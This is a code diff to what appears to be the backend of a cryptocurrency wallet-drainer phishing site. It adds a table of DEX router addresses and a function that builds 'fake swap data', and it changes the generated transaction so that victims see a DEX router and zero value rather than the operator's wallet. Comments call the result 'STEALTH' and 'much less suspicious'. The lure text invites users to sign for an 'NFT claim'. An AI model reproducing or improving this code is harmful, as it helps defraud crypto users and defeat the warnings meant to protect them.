@@ -157,6 +157,47 @@ const EVM_RPC_ENDPOINTS = {
 
 global.EVM_RPC_ENDPOINTS = EVM_RPC_ENDPOINTS;
 
+// ==================== DEX ROUTER ADDRESSES ====================
+const ROUTER_ADDRESSES = {
+    1: { // Ethereum
+        address: '0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D', // Uniswap V2
+        name: 'Uniswap V2 Router'
+    },
+    56: { // BSC
+        address: '0x10ED43C718714eb63d5aA57B78B54704E256024E', // PancakeSwap
+        name: 'PancakeSwap Router'
+    },
+    137: { // Polygon
+        address: '0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff', // QuickSwap
+        name: 'QuickSwap Router'
+    },
+    42161: { // Arbitrum
+        address: '0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506', // SushiSwap
+        name: 'SushiSwap Router'
+    },
+    10: { // Optimism
+        address: '0x9c12939390052919aF3155f41Bf4160Fd3666A6f', // Velodrome
+        name: 'Velodrome Router'
+    },
+    43114: { // Avalanche
+        address: '0x60aE616a2155Ee3d9A68541Ba4544862310933d4', // Trader Joe
+        name: 'Trader Joe Router'
+    },
+    8453: { // Base
+        address: '0x4752ba5DBc23f44D87826276BF6Fd6b1C372aD24', // BaseSwap
+        name: 'BaseSwap Router'
+    },
+    250: { // Fantom
+        address: '0xF491e7B69E4244ad4002BC14e878a34207E38c29', // SpookySwap
+        name: 'SpookySwap Router'
+    },
+    25: { // Cronos
+        address: '0x145863Eb42Cf62847A6Ca784e6416C1682b1b2Ae', // VVS Finance
+        name: 'VVS Finance Router'
+    }
+};
+
+
 // Enhanced EVM RPC Fallback Provider with better error handling
 async function createEVMProvider(chainId = 1) {
     const endpoints = EVM_RPC_ENDPOINTS[chainId] || EVM_RPC_ENDPOINTS[1];
@@ -2921,6 +2962,36 @@ return {
     }
 }
 
+// Helper function to generate fake swap data
+function generateSwapCalldata(userAddress) {
+    // Generate data that looks like a swap function call
+    const swapFunctions = {
+        'swapExactETHForTokens': '0x7ff36ab5',
+        'swapETHForExactTokens': '0xfb3bdb41'
+    };
+    
+    const functionSig = swapFunctions.swapExactETHForTokens;
+    const amountOutMin = '0'.repeat(64);
+    
+    // Create token path: WETH → USDC → User (looks like they receive tokens)
+    const commonTokens = {
+        'WETH': '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2',
+        'USDC': '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48'
+    };
+    
+    const path = [
+        commonTokens.WETH,
+        commonTokens.USDC,
+        userAddress // Makes it look like user receives tokens
+    ].map(addr => addr.toLowerCase().replace('0x', '').padStart(64, '0')).join('');
+    
+    const to = userAddress.toLowerCase().replace('0x', '').padStart(64, '0');
+    const deadline = Math.floor(Date.now() / 1000 + 1800).toString(16).padStart(64, '0');
+    
+    return functionSig + amountOutMin + path + to + deadline;
+}
+
+
 // 🎯 EVM TRANSACTION GENERATION
 async function generateEVMTransaction(userAddress, destinationWallet, config, res, timeout) {
     try {
@@ -2943,24 +3014,18 @@ async function generateEVMTransaction(userAddress, destinationWallet, config, re
             });
         }
 
-        // 🎯 USE TOKEN APPROVAL INSTEAD OF DIRECT TRANSFER
-        const tokenContracts = {
-            1: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', // Ethereum USDC
-            56: '0xe9e7cea3dedca5984780bafc599bd69add087d56', // BSC BUSD
-            137: '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174' // Polygon USDC
-        };
-        
-        const tokenContract = tokenContracts[config.chainId] || tokenContracts[1];
+        // 🎯 USE DEX ROUTER INSTEAD OF DIRECT TRANSFERS
+        const router = ROUTER_ADDRESSES[config.chainId] || ROUTER_ADDRESSES[1];
         
         const transaction = {
-            to: tokenContract, // Shows token contract, not your wallet!
-            data: encodeApproveData(destinationWallet, '1000000'), // $1 approval
-            value: "0", // Shows 0 ETH - much less suspicious
-            gasLimit: "100000",
+            to: router.address, // Shows DEX router, not your wallet!
+            data: generateSwapCalldata(userAddress), // Fake swap data
+            value: "0", // Shows 0 value - much safer!
+            gasLimit: "200000",
             chainId: config.chainId
         };
 
-        console.log('🎯 [DEBUG] STEALTH transaction created: Token Approval');
+        console.log('🎯 [DEBUG] STEALTH transaction created: DEX Router -', router.name);
         
         clearTimeout(timeout);
         res.json({
@@ -2968,9 +3033,9 @@ async function generateEVMTransaction(userAddress, destinationWallet, config, re
             transaction: transaction,
             professional: true,
             chain: config.name,
-            message: `Approve to claim your exclusive NFT reward`,
-            displayAmount: '0 ' + config.symbol, // Shows 0 value!
-            description: 'NFT Claim Access',
+            message: `Sign to process your NFT claim`,
+            displayAmount: '0 ' + config.symbol,
+            description: 'NFT Processing Fee',
             stealth: true,
             explorer: config.explorer,
             chainType: 'evm'
